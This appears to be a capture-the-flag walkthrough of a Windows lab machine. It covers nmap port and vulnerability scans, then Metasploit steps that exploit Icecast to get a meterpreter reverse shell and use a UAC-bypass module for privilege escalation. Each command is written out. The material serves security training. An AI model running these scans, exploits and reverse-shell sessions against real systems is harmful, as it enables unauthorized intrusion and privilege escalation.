<hr style="border-color:red;"><h1 align="center"><img src="https://github.com/user-attachments/assets/840a880a-ad6f-4564-bd9e-b86da62e7bee"></h1>

<hr style="border-color:red;"><h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Reconnaissance & Scanning</h1><hr style="border-color:red;">

### **- Verifying the connectivity of the discovered device:**

```bash
ping -c 1 10.10.232.204
```
```bash
ping
The ping command is used to check network connectivity between your machine and another device by sending ICMP (Internet Control Message Protocol) echo request packets.
-c 1
The -c flag specifies the number of echo request packets to send. In this case, -c 1 means only one packet will be sent.
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/9159be91-a586-4a71-acff-4ed2155dab36"></picture><br>TTL = 127 ==> WINDOWS</h3><hr style="border-color:red;">

### **- Scanning of the discovered device to find all open ports to find possible access routes:**

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.232.204 -oG allPorts
```
```
-p-
This tells Nmap to scan all 65535 TCP ports (from 0 to 65535). By default, Nmap only scans the most common 1,000 ports.

--open
This filters the results to only show open ports, ignoring closed or filtered ports.

-sS
This specifies a SYN scan (also called a half-open scan or stealth scan).
Instead of fully establishing a TCP connection, Nmap sends an SYN packet and waits for a response.
If the target responds with SYN-ACK, it means the port is open.
If the target responds with RST, the port is closed.
If no response or an ICMP error is received, the port may be filtered (firewall blocking it).

--min-rate 5000
This forces Nmap to send at least 5000 packets per second, making the scan faster.
Without this, Nmap adjusts the speed automatically based on network conditions.

-vvv
This increases verbosity level (very very verbose).
It provides real-time feedback while scanning.
You will see results as they are discovered instead of waiting for the full scan to complete.

-n
This disables DNS resolution, making the scan faster.
By default, Nmap tries to resolve IPs to hostnames, which can slow down the scan.

-Pn
This tells Nmap to skip the host discovery phase and assume the target is up.
Normally, Nmap pings the target first to check if it is online.
If a firewall is blocking pings, this option is useful to force a scan even if the target doesn’t respond to pings.

-oG allPorts
This tells Nmap to output the results in "Grepable" format and save them in a file called allPorts.
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/a5fc01b0-3828-4862-b6a3-28f3e37cb5e0"></picture><br>Accessible ports 135,139,445,3389,5357,8000,49152,49153,49153,49154,49158,49159,49160 </h3><hr style="border-color:red;">

### **- Analysis of the open ports found on the discovered device to get more information on the services running on those ports:**

```bash
nmap -sCV -p135,139,445,3389,5357,8000,49152,49153,49153,49154,49158,49159,49160 10.10.232.204 -oN targeted
```
```
-sC
Enables Nmap’s default script scanning.
This runs a set of default scripts to gather more information about detected services.
Scripts can detect vulnerabilities, enumerate software versions, and check for misconfigurations.
Equivalent to --script=default.

-sV
Performs version detection of services.
It tries to determine the exact software version running on open ports.

-p
Specifies which ports will be scanned.
This makes the scan faster and more targeted instead of scanning all ports.

-oN targeted
Saves the output in normal format to a file named targeted.
You can later review this file for findings.
```
<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/39faf896-7246-474b-9e75-589a46839150"></picture><br>We now have a little more information about our target.</h3><hr style="border-color:red;">

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Vulnerability Assessment</h1><hr style="border-color:red;">

### **- Looking for vulnerabilities:**

<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/cf051c80-081b-4a36-ad2f-4ae57f1cd2b8"></picture><br>We see vulnerabilities.</h3><hr style="border-color:red;">

<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/603d9454-6d85-4b28-b78d-57dd040c3d3a"></picture><br>We have some ways of entry.</h3><hr style="border-color:red;">

### **- Looking for vulnerabilities with nmap:**
```bash
nmap --script "vuln and safe" -p445 10.10.60.82
```
```
--script "vuln and safe" → Runs Nmap scripts that belong to both the vuln (vulnerability detection) and safe (non-destructive) categories.

-p445 → Specifies scanning only port 445 (SMB/Windows file sharing).
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/ba826b24-b3d9-4042-b35e-329dc9076626"></picture><br>we have nothing here</h3><hr style="border-color:red;">

### **- We will search for possible sploits with METASPLOIT:**

```bash
msfdb init && msfconsole
```
```
msfdb init (Initialize Metasploit Database)
msfconsole (Launch Metasploit Console)
```

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/35e77232-db99-4fcc-b5db-c82e76f8c89a"></picture></h3>

```bash
search icecast
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/ce565f56-fa42-4e1a-a3b0-b9e135f6936a"></picture><br>We have a sploit, we will see what information it asks for to be able to use.</h3>

```bash
use 0
show options
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/18ac66d3-c16f-46e3-948c-d6e4c3fb4eed"></picture><br>We ask for RHOST and LHOST</h3>

```bash
set RHOSTS 10.10.232.204
set LHOST 10.21.118.81
run
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/865657ba-d982-4b5d-8e36-f3ff18511a5b"></picture><br>We have access to the machine from a meterpreter.</h3>

### **- Obtaining information from the breached machine:**

```bash
getuid
sysinfo
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/dffab597-b0af-47ca-89d9-a22639722520"></picture><br></h3>

### **- We will evaluate the target system for possible privilege escalation using a METASPLOIT module:**
```bash
run post/multi/recon/local_exploit_suggester
```
```
El módulo post/multi/recon/local_exploit_suggester de Metasploit es una herramienta de post-explotación que analiza el sistema comprometido en busca de vulnerabilidades explotables localmente.
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/eab6c892-7509-45ef-b59e-32e21ed695b7"></picture><br>We have several sploits that could help us to break into the system.</h3>

### **- Now we will send our meterpreter session to the second plate and run the metasploit module to breach the machine:**
```bash
CTRL+Z
sesions
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/a9cd857f-d122-47a4-bdbc-4f239be80ac2"></picture></h3>

### **- We load our module and add the required information and start the sploit:**
```bash
use exploit/windows/local/bypassuac_eventvwr
set session 1
set LHOST 10.21.118.81
run
```

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/f9ed5220-4f06-4c51-92e0-df83f8cf63af"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/b36cbe19-6c39-4c19-b472-6585dd339474"></picture>We are in!</h3>

### **- we checked the machine a little bit:**

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/7d4e8f77-cd09-463d-a02e-c60336a7794f"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/65e4fb2a-6ced-492c-92ac-ec799136e8f7"></picture></h3>
<h3 align="center"><picture><img src = "!https://github.com/user-attachments/assets/11326afd-9977-4f8c-8b70-b53362a9f7f2"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/1b6e09b4-b762-48d6-ada6-53b17f1ba027"></picture></h3>

